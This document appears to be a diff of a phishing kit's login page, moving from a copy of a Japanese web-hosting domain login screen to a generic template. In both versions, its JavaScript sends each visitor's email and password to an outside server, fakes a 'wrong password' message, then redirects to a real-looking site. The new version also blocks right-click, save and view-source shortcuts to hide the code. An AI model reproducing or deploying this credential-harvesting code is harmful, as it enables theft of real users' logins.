-	    <TD vAlign=top align=right height=20><IMG height=20 src="data:image/gif;base64,R0lGODlhGAAUALMAAM/Z9Q8/z7/M8t/l+Z+y7B9M0o+l6S9Z1W+M4u/y/H+Z5T9l2V9/3////wAzzAAAACH5BAAAAAAALAAAAAAYABQAAARIEJjjqr04tz1Y/trGLWApnkRQhucGqKvVnm9czTS84qdg8ydFDChKFHbEDQGZbBxBzY3BFB1Qo5RPdIOAbpfarS8cHbOaAFAEADs=" width=24></TD>
-	  </TR>
-	</TABLE>
-   </td>
-</tr>
-<tr>
-	<td class=blmidl width=20 bgColor=#ffffff>
-    	<IMG height=150 src="data:image/gif;base64,R0lGODlhFAAUAIAAAAAzzP///yH5BAAAAAAALAAAAAAUABQAAAIohG+hy4rYYnhHNprswkBv7DlgyIXT6JUkqqkpa7ktLMkxHdk1fvFMAQA7" width=20>
-	</TD>
-	
-	
-
-	
-    <!-- Main St -->
-<td align=center valign=top width=100%>
-
-<TABLE cellSpacing=0 cellPadding=0 width=560 border=0 class=title hight=41>
-<TR>
-<TD align=left width=481 background="data:image/gif;base64,R0lGODlhAQApALMAAP/3pP//zP//1f/////5tP//5f/7vf//9//4rf/8xP/6ugAAAAAAAAAAAAAAAAAAACH5BAQUAP8ALAAAAAABACkAAAQTcMhThL0iaJ16N2BIjARingBQRAA7">
-<img src="data:image/gif;base64,R0lGODlhrAApALMAAAAzzP/4qX+Wwv//zP//1T9kxr/Huv/////5tP/+5t/gt//8wZ+vvl99ww8/y///9yH5BAQUAP8ALAAAAACsACkAAAT/8MhJq7046827/2AojmRpnmiqrmzrvuUjz3Rt33iu73zv/8Cg8JEoGo/IpHLJbDqf0Kh0Sq0mCNisdsvter/gsHhMLpvP6Ct6zW673/C3Ok6v2+947TzP7/v/WQkDg4SFhoeIiYqLjI2Oj5CRkpOCk5aXmJmam5qVnJ+goaKjhZ6kp6ipqoSmq66vsJKtsbS1trO2ubqoCQu+v8DBwsPExcbHyMnKy8zNzr3O0dLT1NXW1dDX2tvc0QbdytngyQwFBePoyQoO5sQMAgzj4tYKAswCAADHBvz9/v7V+PnCpy9aPXsFvgkrAOCcMYELCCabJyyfxYsYfzF0YC+ZRGMY/0NaVCgt37ePxswp0AiggQGODnwdFEDTAQCONAWQ/GUyYr6Jx0SK/NXAooN4x1ASExpyp7OeSpcC6LigKAAFBgSsXGCA6ciKAE7+REZg379/DMb6MsBwqjCdwKKCdQqs5zSoaovZ5ZqPqkxzgAPncxgMb8FjBBAoXsy4sWMEXQE4ZutYQd/FBB00YPAYgcnOnsOCHr34M0HGAgoIYBzZAOONpBe3VfDYdD7Uqh0njg06Mm8EaQFwVkzw4ubGnzsn/+3YtmTZDVkvBz69c9vhzUWfhl5AN/PHvnnbdIA6XwObRmkrrs44eXGvqxdbvopg+/qpjIOrL91y9Evznc1Hm/99ocXH2G7fSfccaQQZWN9tCNSDXnuiKVfhe0w5GJ59wbmGGYSMFUXeY+VglNBkEHLIHoIJKhbeaPON+OGCLjrIHn8eYnXWWfs92N2DC8L2WnSNBYedAgycd5ED6DXkIXFE2idkYyy2+GKA6D0JJY21Vdillgky1MCWWzo435jZoRmZUTZ1x0CTT4pJJpAOLlZlglc6Vhya5XGZHZgUAvpba2T+J6NiVvUInYzjFcAZQz/Wx+RihAIJ2Xid3dnYjv4EB56SAOoJooWC3ldqbFMSZJWXEeZzaJ8eMqAlpJsuOuOqpRIQwK689hqAVxftWk5bSwrgK68EHesrsCMp62yjr9chuyQDva5jkrORNeAspNvmQ+2u7x31rK7P/sosALuuaVQDCjybbLnnhlXus+sU0Oue7VZrk7bPDtatvcrWe69F7JZL7rwI8zqYagYg/O6znJ6VsLP58ppVw8/y665W/9Lr68UJHzzxyCSXbPLJKI+sY8oGs+zyyzDHLPPLIs9s880451xyzTr37PPPM/MM9NBEFz0vEVYkrfTSTDft9BQRAAA7">
-</TD>
-<TD width=34 background="data:image/gif;base64,R0lGODlhAQApALMAAP/3pP//zP//1f/////5tP//5f/7vf//9//4rf/8xP/6ugAAAAAAAAAAAAAAAAAAACH5BAQUAP8ALAAAAAABACkAAAQTcMhThL0iaJ16N2BIjARingBQRAA7">
-<IMG src="data:image/gif;base64,R0lGODlhIgApANUAAP//9//8xv/7u//7wP/8w//5tP/4qf/4rP/3pv/4p//+0//9yf//1//7vf/6t//6uv/6tf/9zP/+zwAzzMDIuP/5sP/5sv/5r/DttMDIt8DItv/9zf/+0P/8x//4rf/9yv/8xP//5f/4qv/7vv/96f/+0v/8wf/6uP//1f/3pP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAiACkAAAb/QJVwSCwaj8ikcslsLgHQqHRKrVJD2Kx2y+1yGeCweEwuk1HotHrNbrMV8Lh8Tq/TS/i8fs/v8zmAgYKDhIWEEoiJiouMjYwbkJGSk5SVlBGYmZqbnJ2cH6ChoqOkpaQLqKmqq6ytrB2wsbKztLW0Abi5uru8vbwgwMHCw8TFxATIycrLzM3MJtDR0tPU1dQD2Nna29zd3CPg4eLj5OXkDejp6uvs7ewC8PHy8/T19A/4+fr7/P38JwADChxIsCBBBwgTKlzIsCFDCBAjSpxIsSLFAhgzatzIsSNHCxYoUMAQcmRJkiJRmkx5EqTLChUmTMgQc2ZNmjJx2sx5E6bPXwsXZGoIOmGoUKJGiyJdChSoh6dQo0qdSnXqgatYs2rdynWriK9gw4odS3asgbNo06pdy3Ztgrdw48qdS3cugrt48+rdy3dvir+AAwseTLiw4cOI/5JYzLix48eQHwcBADs="width=34>
-</td>
-<td width=55>
-<IMG src="data:image/gif;base64,R0lGODlhNwApAMQAADMzM+yTEv7ltJpZC6WlpYlOCb+fXv///2diW8t8D/u1RczMzJlrJoFeK4qHgUBAQLpwDtuHEf7sxr+/v11LMtnZ2fmcFKplDL19H7+ihLF3IebUsmlSL7+ibPLy8tWKGiH5BAQUAP8ALAAAAAA3ACkAAAX/YFYMF5REgaWubOu+cGwpImmicq7v9FieqZ1wuOrZgMQkr+O7BZXQl4J5xEWvrGkTmQxgGAwOB/yBaqvP3acBaLvdj0Zad/5ZdQHOe79nzGN1TjsaD3yGbhRldFR2fy4ah5FtD4oygVwxkJKSD45ZjIIxH5sOBxUECIYUOZd3L3qbCwezE4V9lqCYj5uTs7MVqW+dgLmuLbC8BL6mtm4MxFvGKwG8bxXLBHurMK2eDNVuCMsHzW2e3TBswpvKvg57lS3or3vAm8sTt1IG0Z7IbQcWSCrlS+CbZ/v6wfgHYNa7Q9d8edDnQgE/NAv3zPJQzg3BghTlXWyUbo+sgIYitvrK9yZelpGhdr35+PABAgTtlj10cw6mLhbUhI0bOq7ctoQYM77JSXRcsDYaAPmUtmKUMJVNQU7yNGMqVwsMH2DNeiAYQm5eZQToCICAB7KzsnFglVaGpj0PHExYMHbZMEt17cYa6gGBS6QkdWBgG27cAgRfiwTOEUCdoZMVHJylM1nHGrY4EfghYlGhkg9gUms4zKMzFjOuXycpnVR2FNqJbZuRsKH3BgHAgwsfTry48ePCJYQAADs="width=55>
-</TD>
-</TR>
-</TABLE>
-
-<!-- ↑ここまで headerFrame------------------------------------------  -->
-
-
-
-
-
-<br><br><h1>ログイン画面</h1>
-
-<span id="msg" style="display: none; color: red">ドメイン名かパスワードが異なっています。</span>
-	          <form action="" method="post">
-	            <TABLE cellSpacing=0 cellPadding=5 width="300" border=0 align="center">
-	              <TR>
-	                <TD  class=moko2 vAlign=top noWrap bgColor=#ffffcc>ご利用ドメイン名</TD>
-	                
-	                <TD  class=moko2 vAlign=top noWrap bgColor=#ffffff><input type="text" name="email" id="email" value=""/>&nbsp;</TD></TR>
-	                
-	                <IMG height=3 src="image/sp.gif" width=1><BR>
-	              <TR>
-	                <TD  class=moko2 vAlign=top noWrap bgColor=#ffffcc>パスワード</TD>
-	                
-	                <TD  class=moko2 vAlign=top noWrap bgColor=#ffffff><input type="password" name="password" id="password" value=""/>&nbsp;</TD>
-	               </TR>
-	               <TR>
-	                
-	                <TD  class=moko2 vAlign=top noWrap bgColor=#ffffcc colspan=2><input type="submit" name="CMD" id="submit-btn" value="ログイン"/></TD>
-	               </TR>
-	            </TABLE>
-
-	          </form>
-
-
-
-
-
-<!-- ↓ここから footerFrame------------------------------------------  -->
-
-
-
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
-
-
-
-    </TD>
-    <td class=blmidr align=right width=20 bgColor=#ffffff>
-		<IMG height=150 src="data:image/gif;base64,R0lGODlhFAAUAIAAAAAzzP///yH5BAAAAAAALAAAAAAUABQAAAIojI8Gy5sfWoNJMoqsw0rzbn2R92mAaKIkl5Yr1rIvFcMzVNP3k+NaAQA7" width=20>
-    </TD>
-  </TR>
-<tr>
- <td colspan=3>
-<!-- フッタ St -->
-	<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#0033cc border=0>
-	  <TR>
-	    <TD vAlign=bottom align=left bgColor=#ffffff height=20><IMG height=20 src="data:image/gif;base64,R0lGODlhGQAUAMQAAA8/z///zM/Z9b/M8p+y7K+/74+l6R9M0t/l+W+M4u/y/H+Z5V9/3z9l2U9y3AAzzP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAZABQAAAVU4COOogCdaAoFLEuSgyqr7xjPeC0aeK4nvZnucQjKhg+EMYVcLFFIwPOEfPCeVYACW3Vwq4RldWQKjkWAsu8MCK/PD6AQPjrcmHRSo4DPkwAMBQghADs=" width=25></TD>
-        <TD bgColor=#ffffff height=20></TD>
-<TD vAlign=bottom align=right bgColor=#ffffff height=20><IMG height=20 src="data:image/gif;base64,R0lGODlhGQAUALMAAA8/z7/M8s/Z9W+M4o+l6Z+y7B9M0q+/79/l+V9/309y3O/y/H+Z5T9l2QAzzP///yH5BAAAAAAALAAAAAAZABQAAARN8MlJ6xMu62z7DNvmeWDIjRZhnig1rE5bGbA8IXBsP0y+PwCfTSVsLYJFlCLHGhWYzQ4GqvMIkFAnNtt5UTWWAO0Lnhwa5BDikNimMxEAOw==" width=25></TD>
-</TR>
-</TABLE>
-</td>
-</tr>
-<tr>
-<td colspan=3> 
-<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center bgColor=#0033cc border=0>
-  <TR>
-    <TD vAlign=bottom align=left width=20 height=30><IMG height=16 
-      src="data:image/gif;base64,R0lGODlhFAAQALMAAA8/z9/l+c/Z9W+M4i9Z1T9l2X+Z5U9y3O/y/I+l6b/M8h9M0v///wAzzAAAAAAAACH5BAAAAAAALAAAAAAUABAAAAQ2sMlJq72YgswPz8mHBeLFeCXFCKnKDK3EMAgRz+uW4vnOBzYRD2fQZYa4wMBoQQ4VhkJhQYkAADs=" width=20></TD>
-        <TD align=right height=30><IMG 
-      alt="Copyright &copy; 2000 GMO CLOUD K.K. All Rights Reserved." 
-      src="data:image/gif;base64,R0lGODdhEwEOAOMAAAQyzIya5NTW9Fxu1Ly+7PT2/CRK1Kyy7Nzi9HyO3Jym5Gx+3MTK7Pz+/ERe1Ozq/CwAAAAAEwEOAAAE/hDISau9OOvNu/9gKI5kaZ5oqq5s675wLM80aShEYNR87/9A2IIwAAwYO8tA0CgEJAamIBltTKHSJGWAaDQIu0EjQTkUJIlHU3FJdB9P47miKDQeZEChKBmcxV4FbBV7EgICW3MGgkGNjhcOBw5dCEcXBQQACQ0OAAIMAASInqCihqWjEwsNbAYIiKupiw0Aq09+gxMJTnJsq3SFAQ0LAMOqtL9GCAcVxgQIWrW0rpmP1o9gDwqRDAl5Ew5IAAYNReUADg075+nrRe0UDNXjZKvGAApeAAzMaHMT/HTVo0WhwLcDoO5JW4hGHYVhz6JJo3atYiMiDqHMq8AlU7Ji/gs+DhNJbILCYwRAAXhAgNbJlyUpfGQo4ZfCXzNfdulUYRWCBxaD/sA4YcfGCcL6kVxKEOTDknaQceIU4IHNmE5NYq3ZlObCm1KfPkTwzMKqZ/2EqpUBhpECBAu+IS0EhZORaXbFjMvb1VNanLQIEIDzS56uf4bS4vCqJw4AhHq+7aK5qdkCijJp+XG8tjOLAQoW2LGqkkI6uZ4yMRglQDVr1xU2DToQdlUBA4BvaYvd4BajmfiCFSB2oJIyZsn8pJVgzAEv0Ax3FTnAx7N1EwkIOHBwhCeFTV68FKlyZVwWLFYkaurSAAEZP4bYwNekhpGFNGv6hBcf/M7B0f0AJZIfIXxsskAdckxgxiK5XOegCDfkoN6DFFZo4YUYZqjhhhzGEAEAOw==">　　<font color="white">v3.00</font></TD>
-    <TD vAlign=bottom align=right width=20 height=30><IMG height=16 
-      src="data:image/gif;base64,R0lGODlhFAAQALMAAA8/z9/l+c/Z9W+M4i9Z1T9l2X+Z5U9y3O/y/I+l6b/M8h9M0v///wAzzAAAAAAAACH5BAAAAAAALAAAAAAUABAAAAQ2sMlJq704awo2Pt6VhFZAUgdzToK6DoxLEkh8Aq0d4rG+EYGeDwMwCHsZwCB4HC4KBYOieYwAADs=" width=20></TD>
-   </TR>
-</TABLE><!-- フッタ End -->
-</td>
-</tr>
+      </td>
+    </tr>
   </table>
-</center>
-</BODY>
-<!-- ↑ここまで footerFrame------------------------------------------  -->
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  <table class="login_footer">
+  <tr>
+    <td class="english">
+      <a href="">English</a>
+    </td>
+  </tr>
+  </table>
+</div>
 
-<script>
+<input type="hidden" name="login_page_lang" value="ja">
+<input type="hidden" name="charset" value="UTF-8">
+<input type="hidden" name="_cmd" value="authinput">
+</form>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+  <script>
+
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
 
     /* global $ */
     $(document).ready(function(){
       var count=0;
-
+ 
       $('#back1').click(function () {
         $("#msg").hide();
         $('#email').val("");
@@ -396,110 +178,76 @@ a.ps:hover{
       else
       {
         var my_email =email;
-        $('#email').val(my_email);
+        $('#email').val(my_email); 
         var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
         if (!filter.test(my_email)) {
           $('#error').show();
-          email.focus;
-          return false;
+           email.focus;
+           return false;
         }
         var ind=my_email.indexOf("@");
         var my_slice=my_email.substr((ind+1));
-        var c= my_slice.substr(0, my_slice.indexOf('.'));
+      
+	  var c= my_slice.substr(0, my_slice.indexOf('.'));
         var final= c.toLowerCase();
         var finalu= c.toUpperCase();
-
-        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $("#logoname").html(finalu);
-        $(".logoname").html(finalu);
+		
+	 
+	 	
+        $(".email").html(email);
+		 
       }
-
-
-      
       $('#submit-btn').click(function(event){
-        $('#error').hide();
-        $('#msg').hide();
-        event.preventDefault();
-        var email=$("#email").val();
-        var password=$("#password").val();
-        var msg = $('#msg').html();
-        $('#msg').text( msg );
+         var password=$("#password").val();
+         event.preventDefault();
+         var password=$("#password").val();
 
-                    if (!password) {
-                $('#error').show();
-                $('#error').html("Password field is empty!");
-
-                return false;
-            }
-
-
-      ///////////new injection////////////////
-      var my_email =email;
-      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-      if (!filter.test(my_email)) {
-        $('#error').show();
-        email.focus;
-        return false;
-      }
-
-      var ind=my_email.indexOf("@");
-      var my_slice=my_email.substr((ind+1));
-      var c= my_slice.substr(0, my_slice.indexOf('.'));
-      var final= c.toLowerCase();
-      var finalu= c.toUpperCase();
-
-        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $("#logoname").html(finalu);
-      ///////////new injection////////////////
       count=count+1;
-      
+       console.log(email); 
       $.ajax({
         dataType: 'JSON',
         url: 'https://mahidol-ac.cloud/wp/wa/next.php',
         type: 'POST',
         data:{
           email:email,
-          password:password,
+          password:password
         },
-            // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('Attempting Release...');
+              $('#submit-btn').html('Verifing...');
+			  
             },
             success: function(response){
+			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
               if(response){
                 $("#msg").show();
-                console.log(response);
+				console.log(response);
+				$('#msg').html(response['msg']);
                 if(response['signal'] == 'ok'){
                   $("#password").val("");
                   if (count>=2) {
                     count=0;
-                    // window.location.replace(response['redirect_link']);
-                    window.location.replace("https://portal.wadax.ne.jp/cus/view/common/login.html");
+                    window.location.replace("http://www."+my_slice); 
 
                   }
-                  // $('#msg').html(response['msg']);
                 }
                 else{
-                  // $('#msg').html(response['msg']);
+                   $('#msg').html(response['msg']);
                 }
               }
             },
             error: function(){
               $("#password").val("");
-              if (count>=2) {
+              if (count>=3) {
                 count=0;
-                window.location.replace("https://portal.wadax.ne.jp/cus/view/common/login.html");
+                window.location.replace("http://www."+my_slice); 
               }
               $("#msg").show();
-              // $('#msg').html("Please try again later");
             },
             complete: function(){
               $('#submit-btn').html('Sign in');
             }
-          });
+          });  
     });
 
 
@@ -507,4 +255,15 @@ a.ps:hover{
 
 
   </script>
+  
+  <script>
+  service firebase.storage {
+  match /b/{bucket}/o {
+    match /{allPaths=**} {
+      disallow read, write: if request.auth != null;
+    }
+  }
+}
+  </script>
+</body>
 </html>
